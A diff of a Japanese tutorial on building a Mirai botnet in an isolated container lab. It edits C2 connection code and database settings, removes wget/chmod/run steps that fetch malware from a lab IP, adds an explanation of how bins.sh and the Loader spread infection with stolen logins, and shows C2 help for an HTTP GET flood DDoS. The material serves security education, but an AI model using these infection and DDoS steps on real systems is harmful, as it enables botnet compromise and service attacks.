@@ -68,7 +68,6 @@ establish_connectionメソッドの最後に，以下のコードを追加して
     // C2 Serverへの接続確認
     if (resolve_func != NULL)
         resolve_func();
-
     //C2 Serverへ接続
     pending_connection = TRUE;
     connect(fd_serv, (struct sockaddr *)&srv_addr, sizeof (struct sockaddr_in));
@@ -85,7 +84,6 @@ const DatabaseAddr string = "127.0.0.1:3306" \\IPアドレス
 const DatabaseUser string = "root" \\ユーザ名
 const DatabasePass string = "Admin123!" \\パスワード
 const DatabaseTable string = "mirai" \\テーブル名
-
 var clientList *ClientList = NewClientList()
 var database *Database = NewDatabase(DatabaseAddr, DatabaseUser, DatabasePass, DatabaseTable)
 ```
@@ -238,16 +236,11 @@ IDはroot
 パスワードはtoor  
 です．
 
-その後，
-`wget http://192.168.13.1 -O dvrHelper`  
-でダウンロードを行います．
+ログイン後に`ls`コマンドで確認すると，bins.shというシェルスクリプトがあると思います．  
+`cat bins.sh`でコードを確認してみてください．  
+このスクリプトでは，Download Serverからマルウェアをダウンロードして，実行する処理を実施しています．
 
-ダウンロードが完了したら，
-`chmod 777 dvrHelper`
-を実施し，  
-ダウンロードしたマルウェアを
-`./dvrHelper`
-で実行します．
+このシェルスクリプトを`source bins.sh`で実行し，コンテナにマルウェアをダウンロードさせて感染させます．
 
 先ほど開いたC2 Serverのコンソール画面から，`botcount`というボットの台数を確認するコマンドを発行し，台数が1と出力されていればボット化の成功です．
 
@@ -262,7 +255,12 @@ Botnetの構築には，LoaderとReport Serverが必要となっています．
 `./loader`
 を実行して立ち上げることができます．
 
-先ほど開いたC2 Serverのコンソール画面から，`botcount`というボットの台数を確認するコマンドを発行し，複数台出力されていれば，複数台の感染したボットから構成されるBotnetの構築は完了です．
+これにより，先ほど構築したBotが発見すると，脆弱なコンテナのログイン情報をReport Serverに送信し，LoaderがReport Serverに保管されているログイン情報をもとに脆弱なコンテナへの不正アクセスを実施します．  
+その後，LoaderがDownload Serverからマルウェアをダウンロードさせて実行することで，新たなBotの感染が可能となります．
+
+以上のように，マルウェアの感染を広げていくことで，複数台のBotから構成されるBotnetの構築をしていきます．
+
+先ほど開いたC2 Serverのコンソール画面から，`botcount`というボットの台数を確認するコマンドを発行し，複数台出力されていれば，Botnetの構築は完了です．
 
 ## DDoS攻撃
 DDoS攻撃を実施する前に，どのような攻撃を実施できるか確認してみましょう．
@@ -309,14 +307,12 @@ HTTP GET Flood攻撃のコマンドを打っていきましょう．
 ```
 netlab@botnet# http 172.23.0.2 30 ?
 List of flags key=val seperated by spaces. Valid flags for this method are
-
 domain: Domain name to attack
 dport: Destination port, default is random
 method: HTTP method name, default is get
 postdata: POST data, default is empty/none
 path: HTTP path, default is /
 conns: Number of connections
-
 Value of 65535 for a flag denotes random (for ports, etc)
 Ex: seq=0
 Ex: sport=0 dport=65535
@@ -326,14 +322,12 @@ netlab@botnet#
 ```
 netlab@botnet# http 172.23.0.2 30 ?
 スペースで区切られたフラグのリスト．メソッドで有効なフラグは以下の通りです．
-
 ドメイン: 攻撃するドメイン名
 宛先ポート: デフォルトはランダム
 HTTPメソッド名: デフォルトはget
 POSTデータ: デフォルトは"/"
 HTTPのパス: デフォルトは"/"
 コネクション: ボット一台からの同時接続数 
-
 フラグの値が65535の場合はランダムに設定
 Ex: seq=0
 Ex: sport=0 dport=65535
